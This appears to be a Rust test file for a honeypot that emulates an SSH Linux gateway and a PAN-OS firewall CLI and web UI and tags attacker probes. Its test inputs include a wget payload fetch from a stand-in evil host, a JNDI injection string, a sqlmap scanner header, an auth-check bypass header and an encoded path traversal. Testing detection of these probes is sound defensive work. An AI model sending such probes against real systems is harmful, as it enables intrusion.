use std::sync::Arc;
use std::time::Duration;

use bytes::Bytes;
use hp_core::{Action, Event, Secret};
use hp_track::{Outcome, Session, Track, Value};

const SSH: &str = include_str!("../../../tracks/ssh-linux-gateway.yaml");

fn session(seed: u64) -> Session {
    Session::new(
        Arc::new(Track::from_yaml(SSH).expect("example track is valid")),
        seed,
    )
}
fn login(user: &str) -> Event {
    Event::AuthAttempt {
        user: user.into(),
        secret: Secret::new("hunter2"),
    }
}
fn cmd(c: &str) -> Event {
    Event::Command(c.into())
}

fn sent(o: &Outcome) -> String {
    o.actions
        .iter()
        .filter_map(|a| match a {
            Action::Send(b) => Some(String::from_utf8_lossy(b).into_owned()),
            _ => None,
        })
        .collect()
}
fn auth(o: &Outcome) -> Option<bool> {
    o.actions.iter().find_map(|a| match a {
        Action::AuthResult(b) => Some(*b),
        _ => None,
    })
}
fn delay(o: &Outcome) -> Option<Duration> {
    o.actions.iter().find_map(|a| match a {
        Action::Delay(d) => Some(*d),
        _ => None,
    })
}

#[test]
fn fails_three_logins_then_succeeds() {
    let mut s = session(1);
    for i in 0..3 {
        let o = s.step(&login("root"));
        assert_eq!(auth(&o), Some(false), "attempt {i}");
        let d = delay(&o).unwrap();
        assert!((800..=1500).contains(&(d.as_millis() as u64)), "{d:?}");
        assert_eq!(s.state(), "auth");
    }
    let o = s.step(&login("root"));
    assert_eq!(auth(&o), Some(true));
    assert_eq!(o.tags, ["auth_success"]);
    assert_eq!(o.transitions, [("auth".to_string(), "shell".to_string())]);
    assert_eq!(s.state(), "shell");
    assert_eq!(s.vars()["failed_logins"], Value::Int(3));
    assert!(o.errors.is_empty());
}

#[test]
fn shell_answers_and_remembers() {
    let mut s = session(1);
    for _ in 0..4 {
        s.step(&login("a"));
    }
    assert_eq!(sent(&s.step(&cmd("whoami"))), "admin\n");
    assert_eq!(sent(&s.step(&cmd("pwd"))), "/home/admin\n");
    assert!(s.step(&cmd("cd /var/tmp")).actions.is_empty());
    assert_eq!(sent(&s.step(&cmd("pwd"))), "/var/tmp\n");
}

#[test]
fn fetch_is_tagged_and_faked() {
    let mut s = session(7);
    for _ in 0..4 {
        s.step(&login("a"));
    }
    let o = s.step(&cmd("wget http://evil.example/x/bot.sh"));
    assert_eq!(o.tags, ["payload_fetch"]);
    assert!(sent(&o).contains("Saving to: 'bot.sh'"));
    let ms = delay(&o).unwrap().as_millis();
    assert!((2000..=4000).contains(&ms));
}

#[test]
fn open_shell_is_emitted_with_the_auth_verdict() {
    let t = Track::from_yaml(
        "
name: t
start: a
states:
  a:
    on:
      - match: { event: auth_attempt }
        do: [ { auth: true }, { open_shell: true } ]
      - match: { command: x }
        do: [ { open_shell: false } ]
    fallback: { close: true }
",
    )
    .unwrap();
    let mut s = Session::new(Arc::new(t), 0);
    let o = s.step(&login("root"));
    assert!(matches!(
        o.actions[..],
        [Action::AuthResult(true), Action::OpenShell]
    ));
    assert!(
        s.step(&cmd("x")).actions.is_empty(),
        "open_shell: false is a no-op"
    );
}

#[test]
fn fallback_and_close() {
    let mut s = session(1);
    for _ in 0..4 {
        s.step(&login("a"));
    }
    assert_eq!(
        sent(&s.step(&cmd("frobnicate --now"))),
        "-bash: frobnicate: command not found\n"
    );
    assert_eq!(sent(&s.step(&cmd(""))), "-bash: : command not found\n");
    assert!(matches!(s.step(&cmd("exit")).actions[..], [Action::Close]));
}

#[test]
fn unexpected_input_hits_the_fallback_and_never_panics() {
    let mut s = session(1);
    // Input of a kind the state has no rule for: the fallback answers (here, closes).
    for ev in [
        Event::Raw(Bytes::from_static(b"\xff\xfe\x00")),
        Event::Request {
            op: "x".into(),
            args: serde_json_null(),
        },
    ] {
        let o = s.step(&ev);
        assert!(matches!(o.actions[..], [Action::Close]));
    }
}
fn serde_json_null() -> serde_json::Value {
    serde_json::Value::Null
}

#[test]
fn same_seed_same_delays() {
    let run = |seed| {
        let mut s = session(seed);
        (0..3)
            .map(|_| delay(&s.step(&login("r"))).unwrap())
            .collect::<Vec<_>>()
    };
    assert_eq!(run(42), run(42));
    assert_ne!(run(42), run(43));
}

#[test]
fn runtime_errors_are_reported_not_fatal() {
    let t = Track::from_yaml(
        "
name: t
vars: { n: 0 }
start: a
states:
  a:
    on:
      - match: { command: 'x' }
        when: n
        do: [ { send: 'never' } ]
      - match: { command: 'y' }
        do: [ { set: { n: '1 / n' } }, { send: 'after' } ]
    fallback: { send: 'fb' }
",
    )
    .unwrap();
    let mut s = Session::new(Arc::new(t), 0);
    let o = s.step(&cmd("x"));
    assert_eq!(sent(&o), "fb");
    assert_eq!(o.errors.len(), 1);
    let o = s.step(&cmd("y"));
    assert_eq!(sent(&o), "after");
    assert_eq!(o.errors.len(), 1);
    assert_eq!(s.vars()["n"], Value::Int(0));
}

#[test]
fn string_variables_are_capped() {
    let t = Track::from_yaml(
        "
name: t
vars: { s: 'x' }
start: a
states:
  a:
    on:
      - match: { command: 'grow' }
        do: [ { set: { s: 's + s' } } ]
    fallback: { send: '${len(s)}' }
",
    )
    .unwrap();
    let mut s = Session::new(Arc::new(t), 0);
    let mut errors = 0;
    for _ in 0..40 {
        errors += s.step(&cmd("grow")).errors.len();
    }
    assert!(errors > 0, "growth must eventually be refused");
    let len: usize = sent(&s.step(&cmd("len"))).parse().unwrap();
    assert!(len <= 64 * 1024, "len={len}");
}

#[test]
fn lifecycle_events_are_not_answered_by_the_fallback() {
    // The example's `auth` fallback closes the connection; that must not
    // fire just because a peer connected or left.
    let mut s = session(1);
    for ev in [Event::Connected, Event::Disconnected] {
        let o = s.step(&ev);
        assert!(o.actions.is_empty() && o.errors.is_empty(), "{ev:?}: {o:?}");
    }
    assert_eq!(s.state(), "auth");
}

#[test]
fn rules_can_still_react_to_lifecycle_events() {
    let t = Track::from_yaml(
        "
name: t
vars: { greeted: 0 }
start: a
states:
  a:
    on:
      - match: { event: connected }
        do: [ { send: 'hello' }, { set: { greeted: 1 } } ]
      - match: { event: disconnected }
        do: [ { tag: left } ]
    fallback: { send: 'fb' }
",
    )
    .unwrap();
    let mut s = Session::new(Arc::new(t), 0);
    assert_eq!(sent(&s.step(&Event::Connected)), "hello");
    assert_eq!(s.vars()["greeted"], Value::Int(1));
    assert_eq!(s.step(&Event::Disconnected).tags, ["left"]);
    assert_eq!(sent(&s.step(&cmd("x"))), "fb");
}

#[test]
fn request_fields_match_and_user_alone_still_means_an_auth_attempt() {
    let track = Track::from_yaml(
        r#"
name: req
start: a
states:
  a:
    on:
      - match: { method: '^POST$', path: '^/login$', password: '.' }
        do: [ { send: 'login ${user}' } ]
      - match: { headers: '(?m)^user-agent: sqlmap' }
        do: [ { tag: scanner }, { send: 'scanner' } ]
      - match: { path: '^/(?P<f>[^/]+)$', query: 'x=1' }
        do: [ { send: 'file ${f}' } ]
      - match: { body: 'jndi' }
        do: [ { send: 'body' } ]
      - match: { user: 'root' }
        do: [ { send: 'ssh-style' } ]
    fallback: { send: 'none' }
"#,
    )
    .unwrap();
    let mut s = Session::new(Arc::new(track), 1);
    let req = |args: serde_json::Value| Event::Request {
        op: "x".into(),
        args,
    };
    use serde_json::json;
    let o = s.step(&req(json!({
        "method": "POST", "path": "/login", "user": "bob", "password": "pw"
    })));
    assert_eq!(sent(&o), "login bob");
    // Same request without credentials: the password field is unbound.
    let o = s.step(&req(json!({ "method": "POST", "path": "/login" })));
    assert_eq!(sent(&o), "none");
    let o = s.step(&req(
        json!({ "headers": "host: a\nuser-agent: sqlmap/1.7\n" }),
    ));
    assert_eq!(
        (sent(&o).as_str(), o.tags.as_slice()),
        ("scanner", &["scanner".to_string()][..])
    );
    assert_eq!(
        sent(&s.step(&req(json!({ "path": "/a.txt", "query": "x=1" })))),
        "file a.txt"
    );
    assert_eq!(
        sent(&s.step(&req(json!({ "body": "${jndi:ldap://x}" })))),
        "body"
    );
    // `user:` alone binds to auth attempts, not to requests carrying a user.
    assert_eq!(sent(&s.step(&req(json!({ "user": "root" })))), "none");
    assert_eq!(sent(&s.step(&login("root"))), "ssh-style");
}

#[test]
fn every_shipped_track_is_valid() {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../tracks");
    let mut loaded = 0;
    for entry in std::fs::read_dir(dir).unwrap() {
        let path = entry.unwrap().path();
        if path.extension().is_some_and(|e| e == "yaml") {
            Track::load(&path).unwrap_or_else(|e| panic!("{}: {e}", path.display()));
            loaded += 1;
        }
    }
    assert!(loaded >= 2, "found {loaded} tracks");
}

fn prompt(o: &Outcome) -> Option<String> {
    o.actions.iter().find_map(|a| match a {
        Action::Prompt(p) => Some(p.clone()),
        _ => None,
    })
}

fn panos(track: &str) -> Session {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../tracks");
    Session::new(Arc::new(Track::load(&dir.join(track)).unwrap()), 7)
}

#[test]
fn panos_cli_sets_its_own_prompt_and_tracks_config_mode() {
    let mut s = panos("ssh-panos.yaml");
    assert_eq!(auth(&s.step(&login("admin"))), Some(false));
    assert_eq!(auth(&s.step(&login("admin"))), Some(false));
    let o = s.step(&login("admin"));
    assert_eq!(auth(&o), Some(true));
    assert_eq!(prompt(&o).as_deref(), Some("admin@fw-edge01> "));
    assert!(sent(&s.step(&cmd("show system info"))).contains("model: PA-3220"));
    assert_eq!(sent(&s.step(&cmd("ls -la"))), "Unknown command: ls\n");
    let o = s.step(&cmd("configure"));
    assert_eq!(prompt(&o).as_deref(), Some("admin@fw-edge01# "));
    assert_eq!(s.state(), "config");
    assert_eq!(
        s.step(&cmd("set deviceconfig system hostname x")).tags,
        ["config_change"]
    );
    let o = s.step(&cmd("exit"));
    assert_eq!(prompt(&o).as_deref(), Some("admin@fw-edge01> "));
    assert_eq!(s.state(), "cli");
}

#[test]
fn panos_web_ui_api_and_globalprotect() {
    use serde_json::json;
    let req = |method: &str, path: &str, query: &str, extra: serde_json::Value| {
        let mut args = json!({
            "method": method, "path": path, "query": query, "headers": "", "body": ""
        });
        for (k, v) in extra.as_object().unwrap() {
            args[k] = v.clone();
        }
        Event::Request {
            op: format!("{method} {path}"),
            args,
        }
    };
    let creds = json!({ "user": "admin", "password": "admin" });
    let mut s = panos("http-panos.yaml");

    assert!(sent(&s.step(&req("GET", "/", "", json!({})))).contains("Location: /php/login.php"));
    assert!(sent(&s.step(&req("GET", "/php/login.php", "", json!({})))).contains("name=\"passwd\""));
    for _ in 0..2 {
        let o = s.step(&req("POST", "/php/login.php", "", creds.clone()));
        assert_eq!(auth(&o), Some(false));
        assert!(sent(&o).contains("Invalid username or password"));
    }
    let o = s.step(&req("POST", "/php/login.php", "", creds.clone()));
    assert_eq!(
        (auth(&o), o.tags.clone()),
        (Some(true), vec!["auth_success".to_string()])
    );
    let cookie = json!({ "headers": "cookie: PHPSESSID=k3j9d2qv8m1f0r7t5c4b6n8p2a\n" });
    assert!(sent(&s.step(&req("GET", "/", "", cookie))).contains("PA-3220"));

    let keygen = "type=keygen&user=admin&password=admin";
    assert!(sent(&s.step(&req("GET", "/api/", keygen, json!({})))).contains("Invalid Credential"));
    assert!(sent(&s.step(&req("GET", "/api/", keygen, json!({})))).contains("Invalid Credential"));
    assert!(sent(&s.step(&req("GET", "/api/", keygen, json!({})))).contains("<key>LUFRPT"));

    let o = s.step(&req("GET", "/global-protect/prelogin.esp", "", json!({})));
    assert_eq!(o.tags, ["globalprotect_probe"]);
    assert!(sent(&o).contains("<prelogin-response>"));

    let o = s.step(&req(
        "GET",
        "/php/x.php",
        "",
        json!({ "headers": "x-pan-authcheck: off\n" }),
    ));
    assert_eq!(o.tags, ["auth_bypass_probe"]);
    assert_eq!(
        s.step(&req("GET", "/unauth/%252e%252e/php/a.php", "", json!({})))
            .tags,
        ["path_traversal"]
    );
}
